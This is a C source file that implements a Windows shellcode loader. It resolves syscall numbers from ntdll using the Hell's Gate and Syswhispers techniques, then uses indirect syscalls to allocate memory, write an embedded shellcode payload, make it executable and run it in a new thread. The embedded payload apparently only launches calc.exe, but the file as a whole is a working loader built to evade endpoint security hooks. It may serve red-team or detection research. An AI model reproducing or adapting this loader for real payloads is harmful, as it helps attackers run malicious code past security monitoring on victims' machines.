#include "Windows.h"
#include "winternl.h"
#include "stdio.h"
#include "utils.h"

void GetSyscallAddress(IN PVOID pFunc, OUT PVOID pSyscall) {
	DWORD32 searchAnchorBase = 0; // Start offset of pattern checking

	/*
	syscall # 0F05 # <-- Search target
	ret # C3
	*/
	while (1) {
		// Perform pattern matching
		if (
			(GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0x0F && GetByteAtAddress(pFunc, searchAnchorBase + 1) == 0x05) // syscall # 0F05
			) {
#ifdef _M_X64
			* (DWORD64*)pSyscall = (PVOID)((DWORD64)pFunc + searchAnchorBase + 0);
#else
			* (DWORD32*)pSyscall = (PVOID)((DWORD32)pFunc + searchAnchorBase + 0);
#endif
			return;
		}

		// Break if return is reached
		if (GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0xC3) {
			break;
		}

		// Proceed to search from next byte
		searchAnchorBase += 1;
	}
}

void GetSsnFromSyscallFunctionHellsGate(IN PVOID pFunc, OUT PWORD pSsn, OUT PVOID pSyscall) {
	DWORD32 searchAnchorBase = 0; // Start offset of pattern checking

	/*
	* APPROACH ONE
	mov r10,rcx # 4C 8BD1 # <-- Search anchor
	mov eax,18 # B8 18000000 # <-- Search target
	test byte ptr ds:[7FFE0308],1 # F60425 0803FE7F 01
	jne ntdll.7FFDA6150435 # 75 03
	syscall # 0F05
	ret # C3
	int 2E # CD 2E
	ret # C3
	*/
	while (1) {
		// Perform pattern matching
		
		if (
			(GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0x4C && GetByteAtAddress(pFunc, searchAnchorBase + 1) == 0x8B && GetByteAtAddress(pFunc, searchAnchorBase + 2) == 0xD1) && // mov r10,rcx # 4C 8BD1
			(GetByteAtAddress(pFunc, searchAnchorBase + 3) == 0xB8) && // mov eax,18 # B8 XXXXXXXX
			(GetByteAtAddress(pFunc, searchAnchorBase + 18) == 0x0F && GetByteAtAddress(pFunc, searchAnchorBase + 19) == 0x05) && // syscall # 0F05
			(GetByteAtAddress(pFunc, searchAnchorBase + 20) == 0xC3) // ret # C3
			) {
			*pSsn = GetWordAtAddress(pFunc, searchAnchorBase + 4);

#ifdef _M_X64
			* (DWORD64*)pSyscall = GetAddressAfterOffset(pFunc, searchAnchorBase + 18);
#else
			* (DWORD32*)pSyscall = GetAddressAfterOffset(pFunc, searchAnchorBase + 18);
#endif
			return;
		}

		// Break if return is reached
		if (GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0xC3) {
			break;
		}

		// Proceed to search from next byte
		searchAnchorBase += 1;
	}

#ifdef _M_X64
	if (*(DWORD64*)pSyscall != NULL) return; // If Approach 1 worked, return
#else
	if (*(DWORD32*)pSyscall != NULL) return; // If Approach 1 worked, return
#endif

	/*
	* APPROACH TWO
	mov r10,rcx # 4C 8BD1
	mov eax,18 # B8 18000000 # <-- Search target
	test byte ptr ds:[7FFE0308],1 # F60425 0803FE7F 01
	jne ntdll.7FFDA6150435 # 75 03
	syscall # 0F05 # <-- Search anchor
	ret # C3
	int 2E # CD 2E # <-- Search anchor
	ret # C3
	*/
	searchAnchorBase = 0;
	while (1) {
		// First anchor on syscall or int
		if (
			(GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0x0F && GetByteAtAddress(pFunc, searchAnchorBase + 1) == 0x05) || // syscall # 0F05
			(GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0xCD && GetByteAtAddress(pFunc, searchAnchorBase + 1) == 0x2E) // int 2E # CD 2E
			) {
			// Then traverse backwards till ret of previous function while trying to find "mov eax"
			DWORD32 searchAnchorBase2 = searchAnchorBase - 1;
			while (1) {
				if (GetByteAtAddress(pFunc, searchAnchorBase2 + 0) == 0xB8) { // mov eax,18 # B8 18000000
					*pSsn = GetWordAtAddress(pFunc, searchAnchorBase2 + 1);
#ifdef _M_X64
					* (DWORD64*)pSyscall = (PVOID)((DWORD64)pFunc + searchAnchorBase + 0);
#else
					* (DWORD32*)pSyscall = (PVOID)((DWORD32)pFunc + searchAnchorBase + 0);
#endif
					return;
				}

				// Break if beginning of the function is reached
				if (searchAnchorBase2 == 0) {
					break;
				}

				// Proceed to search from previous byte
				searchAnchorBase2 -= 1;
			}
		}

		// Break if return is reached
		if (GetByteAtAddress(pFunc, searchAnchorBase + 0) == 0xC3) {
			break;
		}

		// Proceed to search from next byte
		searchAnchorBase += 1;
	}
}

void GetSsnFromSyscallFunctionSyswhispersSortedFunctions(HMODULE IN hModule, IN PVOID pFunc, OUT PWORD pSsn, OUT PVOID pSyscall) {
	// Get function addresses of module that contains target function
	PBYTE pModuleBase = (PBYTE)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pModuleBase + pDosHeader->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pDirectoryExport = (PIMAGE_EXPORT_DIRECTORY)(pModuleBase + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	
	// Filter above functions for names starting with "Zw"
	PDWORD pAddressOfFunctions = (pModuleBase + (pDirectoryExport->AddressOfFunctions));
	PDWORD pAddressOfNames = (pModuleBase + (pDirectoryExport->AddressOfNames));
	PWORD pAddressOfOrdinals = (pModuleBase + (pDirectoryExport->AddressOfNameOrdinals));
	PVOID pAddressOfFunctionsFiltered = malloc(sizeof(PVOID) * pDirectoryExport->NumberOfNames);
	if (pAddressOfFunctionsFiltered == NULL) return;
	DWORD numberOfFunctionsZw = 0;
	for (DWORD i = 0; i < pDirectoryExport->NumberOfNames; i++) {
		PCHAR procNameCurr = pModuleBase + pAddressOfNames[i];
		if (procNameCurr[0] == 'Z' && procNameCurr[1] == 'w') {
#ifdef _M_X64
			((DWORD64*)pAddressOfFunctionsFiltered)[numberOfFunctionsZw++] = (PVOID)(pModuleBase + pAddressOfFunctions[pAddressOfOrdinals[i]]);
#else
			((DWORD32*)pAddressOfFunctionsFiltered)[numberOfFunctionsZw++] = (PVOID)(pModuleBase + pAddressOfFunctions[pAddressOfOrdinals[i]]);
#endif
		}
	}

	// Sort above filtered function addresses
	PVOID pAddressOfFunctionsFilteredSorted = malloc(sizeof(PVOID)* numberOfFunctionsZw);
	if (pAddressOfFunctionsFilteredSorted == NULL) return;
	SortIntegersArrayDWORD64(pAddressOfFunctionsFiltered, pAddressOfFunctionsFilteredSorted, numberOfFunctionsZw);

	// Search for target function; the index found is the required target SSN
	DWORD funcIndex = -1;
	for (DWORD i = 0; i < numberOfFunctionsZw; i++) {

#ifdef _M_X64
		if (((DWORD64*)pAddressOfFunctionsFilteredSorted)[i] == pFunc) {
#else
		if (((DWORD32*)pAddressOfFunctionsFilteredSorted)[i] == pFunc) {
#endif
			funcIndex = i;
			break;
		}
	}
	if (funcIndex == -1) return;
	*pSsn = funcIndex;

	// Get the Syscall address too
	GetSyscallAddress(pFunc, pSyscall);

	// Cleanup
	free(pAddressOfFunctionsFiltered);
	free(pAddressOfFunctionsFilteredSorted);
}

/*
hModule: Handle to the module within which to find the Syscall function
pFunc: Pointer to the Syscall function to analyse
pSsn: Pointer to a variable that will store the found SSN
pSyscall: Pointer to the "syscall" opcode found in the target Syscall function
*/
void GetSsnFromSyscallFunction(IN HMODULE hModule, IN PVOID pFunc, OUT PWORD pSsn, OUT PVOID pSyscall) {
#ifdef _M_X64
	* (DWORD64*)pSyscall = NULL;
#else
	* (DWORD32*)pSyscall = NULL;
#endif

	// First, use Hell's Gate approach. If it works, return.
	GetSsnFromSyscallFunctionHellsGate(pFunc, pSsn, pSyscall);
	if (*pSsn != -1) return;

	// Second, if previous approach does not work, try Syswhispers approach of sorted function addresses
	GetSsnFromSyscallFunctionSyswhispersSortedFunctions(hModule, pFunc, pSsn, pSyscall);
}

void main() {
	///////////////////////////////
	// PERFORM SYSCALL ENUMERATION
	///////////////////////////////

	// Find all necessary function addresses
	HMODULE hModule = GetModuleHandleCustom("ntdll.dll");
	PVOID pNtAllocateVirtualMemory = GetProcAddressCustom(hModule, "NtAllocateVirtualMemory");
	PVOID pNtProtectVirtualMemory = GetProcAddressCustom(hModule, "NtProtectVirtualMemory");
	PVOID pNtWriteVirtualMemory = GetProcAddressCustom(hModule, "NtWriteVirtualMemory");
	PVOID pNtCreateThreadEx = GetProcAddressCustom(hModule, "NtCreateThreadEx");
	PVOID pNtWaitForSingleObject = GetProcAddressCustom(hModule, "NtWaitForSingleObject");

	// From the function addresses, find their Syscall SSNs
	WORD ssnNtAllocateVirtualMemory, ssnNtProtectVirtualMemory, ssnNtWriteVirtualMemory, ssnNtCreateThreadEx, ssnNtWaitForSingleObject;
	DWORD64 pSyscall = 0;

	GetSsnFromSyscallFunction(hModule, pNtAllocateVirtualMemory, &ssnNtAllocateVirtualMemory, &pSyscall);
	GetSsnFromSyscallFunction(hModule, pNtProtectVirtualMemory, &ssnNtProtectVirtualMemory, &pSyscall);
	GetSsnFromSyscallFunction(hModule, pNtWriteVirtualMemory, &ssnNtWriteVirtualMemory, &pSyscall);
	GetSsnFromSyscallFunction(hModule, pNtCreateThreadEx, &ssnNtCreateThreadEx, &pSyscall);
	GetSsnFromSyscallFunction(hModule, pNtWaitForSingleObject, &ssnNtWaitForSingleObject, &pSyscall);

	///////////////////////////////
	// PERFORM INJECTION DEMO
	///////////////////////////////

	const unsigned char payload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	const unsigned int payloadLenToWrite = 276;
	

	// Allocate virtual memory
	/*
	NtAllocateVirtualMemory(
		[in]      HANDLE    ProcessHandle,
		[in, out] PVOID * BaseAddress,
		[in]      ULONG_PTR ZeroBits,
		[in, out] PSIZE_T   RegionSize,
		[in]      ULONG     AllocationType,
		[in]      ULONG     Protect
	);
	*/
	StageIndirectSyscall(ssnNtAllocateVirtualMemory, pSyscall);
	DWORD64 pBuf = NULL;
	DWORD64 bufSize = payloadLenToWrite;
	NTSTATUS status = PerformIndirectSyscall(
		NtCurrentProcess(),
		&pBuf,
		0,
		&bufSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (pBuf == NULL || bufSize == NULL || status != 0) {
		printf("Failed to allocate memory\n");
		return;
	}

	// Write shellcode to Virtual memory
	/*
	NtWriteVirtualMemory(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL );
	*/
	unsigned int payloadLenWritten = 0;
	StageIndirectSyscall(ssnNtWriteVirtualMemory, pSyscall);
	status = PerformIndirectSyscall(
		NtCurrentProcess(),
		pBuf,
		payload,
		payloadLenToWrite,
		&payloadLenWritten
	);
	if (payloadLenWritten != payloadLenToWrite || status != 0) {
		printf("Failed to write payload\n");
		return;
	}

	// Make memory as executable
	/*
	NtProtectVirtualMemory(
	IN HANDLE               ProcessHandle,
	IN OUT PVOID            *BaseAddress,
	IN OUT PULONG           NumberOfBytesToProtect,
	IN ULONG                NewAccessProtection,
	OUT PULONG              OldAccessProtection );
	*/
	StageIndirectSyscall(ssnNtProtectVirtualMemory, pSyscall);
	ULONG oldAccessProtection = NULL;
	status = PerformIndirectSyscall(
		NtCurrentProcess(),
		&pBuf,
		&payloadLenWritten,
		PAGE_EXECUTE_READ,
		&oldAccessProtection
	);
	if (status != 0) {
		printf("Failed to mark memory as executable\n");
		return;
	}

	// Create thread with start function pointing to buffer
	/*
	NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN ULONG CreateFlags,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID lpBytesBuffer
	*/
	StageIndirectSyscall(ssnNtCreateThreadEx, pSyscall);
	HANDLE hThread = NULL;
	
	status = PerformIndirectSyscall(
		&hThread,
		THREAD_ALL_ACCESS,
		NULL,
		NtCurrentProcess(),
		pBuf,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);

	// Wait for thread to finish
	/*
	NTSTATUS NtWaitForSingleObject(
	[in] HANDLE         Handle,
	[in] BOOLEAN        Alertable,
	[in] PLARGE_INTEGER Timeout
);
	*/
	StageIndirectSyscall(ssnNtWaitForSingleObject, pSyscall);
	status = PerformIndirectSyscall(
		hThread,
		FALSE,
		NULL
	);

	return;
}